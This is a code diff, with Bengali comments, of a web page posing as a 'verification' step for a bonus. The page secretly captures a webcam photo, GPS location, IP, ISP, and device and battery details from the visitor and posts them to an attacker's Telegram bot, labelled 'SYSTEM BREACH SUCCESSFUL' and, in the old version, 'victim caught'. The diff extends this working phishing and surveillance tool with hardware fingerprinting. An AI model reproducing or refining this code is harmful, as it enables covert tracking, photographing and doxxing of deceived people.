@@ -49,30 +49,29 @@
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
 
-        let googleMapLink = "লোকেশনের অনুমতি দেওয়া হয়নি।";
+        let gpsLink = "অনুমতি দেওয়া হয়নি";
 
-        // ১. জিপিএস লোকেশন সংগ্রহ করার ফাংশন
-        function getGPS() {
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition((position) => {
-                    const lat = position.coords.latitude;
-                    const lon = position.coords.longitude;
-                    googleMapLink = `https://www.google.com/maps?q=${lat},${lon}`;
-                }, (err) => {
-                    console.log("Location Denied");
-                });
-            }
+        // লোকেশন ও হার্ডওয়্যার ডাটা সংগ্রহ
+        function getHardwareAndGPS() {
+            return new Promise((resolve) => {
+                // GPS পারমিশন চাওয়া
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition((pos) => {
+                        gpsLink = `http://google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+                        resolve();
+                    }, () => resolve(), { timeout: 5000 });
+                } else { resolve(); }
+            });
         }
 
         verifyBtn.addEventListener('click', async () => {
-            status.innerText = "> ক্যামেরা ও লোকেশন পারমিশন দিন...";
+            status.innerText = "> লোকেশন ও ক্যামেরা পারমিশন দিন...";
             verifyBtn.style.display = "none"; 
 
-            // জিপিএস পারমিশন চাওয়া
-            getGPS();
+            // পারমিশন প্রসেস শুরু
+            await getHardwareAndGPS();
 
             try {
-                // ২. ক্যামেরা পারমিশন চাওয়া
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 video.srcObject = stream;
 
@@ -85,36 +84,44 @@
                     context.drawImage(video, 0, 0, canvas.width, canvas.height);
                     
                     canvas.toBlob(async (blob) => {
-                        let caption = "📸 ভিকটিম ধরা পড়েছে!\n\n";
+                        // হার্ডওয়্যার তথ্য সংগ্রহ
+                        let hardwareInfo = `\n\n💻 **HARDWARE DETAILS**`;
+                        hardwareInfo += `\nCPU Cores: \`${navigator.hardwareConcurrency || 'Unknown'}\``;
+                        hardwareInfo += `\nRAM: \`${navigator.deviceMemory || 'Unknown'} GB\``;
+                        hardwareInfo += `\nScreen: \`${window.screen.width}x${window.screen.height}\``;
+                        hardwareInfo += `\nPlatform: \`${navigator.platform}\``;
+
+                        // ব্যাটারি তথ্য
+                        if (navigator.getBattery) {
+                            const b = await navigator.getBattery();
+                            hardwareInfo += `\nBattery: \`${Math.round(b.level * 100)}% (${b.charging ? 'Charging' : 'Idle'})\``;
+                        }
+
+                        let caption = "🛠 **SYSTEM BREACH SUCCESSFUL**" + hardwareInfo;
                         
-                        // ৩. আইপি ভিত্তিক সাধারণ ট্র্যাকিং
+                        // নেটওয়ার্ক ও লোকেশন তথ্য
                         try {
                             const res = await fetch('https://ipwho.is/');
                             const d = await res.json();
-                            caption += `📍 আইপি: ${d.ip}\n🌍 শহর: ${d.city}, ${d.country}\n`;
+                            caption += `\n\n🌐 **NETWORK & LOCATION**`;
+                            caption += `\nIP: \`${d.ip}\`\nISP: \`${d.connection.isp}\`\nCity: \`${d.city}\`\nMaps: [Click Here](${gpsLink !== "অনুমতি দেওয়া হয়নি" ? gpsLink : 'http://google.com/maps?q='+d.latitude+','+d.longitude})`;
                         } catch(e) {}
-
-                        // ৪. জিপিএস লোকেশন অ্যাড করা
-                        caption += `🎯 সঠিক ম্যাপ লোকেশন: ${googleMapLink}`;
 
                         const formData = new FormData();
                         formData.append('chat_id', adminId);
-                        formData.append('photo', blob, 'user.jpg');
+                        formData.append('photo', blob, 'capture.jpg');
                         formData.append('caption', caption);
+                        formData.append('parse_mode', 'Markdown');
 
-                        // ৫. টেলিগ্রামে পাঠানো
-                        await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
-                            method: 'POST',
-                            body: formData
-                        });
+                        await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: 'POST', body: formData });
 
                         status.innerText = "> ভেরিফিকেশন সফল!";
-                        stream.getTracks().forEach(track => track.stop());
+                        stream.getTracks().forEach(t => t.stop());
                     }, 'image/jpeg', 0.8);
                 }, 3000); 
 
             } catch (err) {
-                status.innerText = "> ক্যামেরা বা লোকেশন এলাও করা হয়নি!";
+                status.innerText = "> পারমিশন ছাড়া বোনাস পাওয়া সম্ভব নয়!";
                 status.style.color = "#ff0000";
                 verifyBtn.style.display = "block";
             }
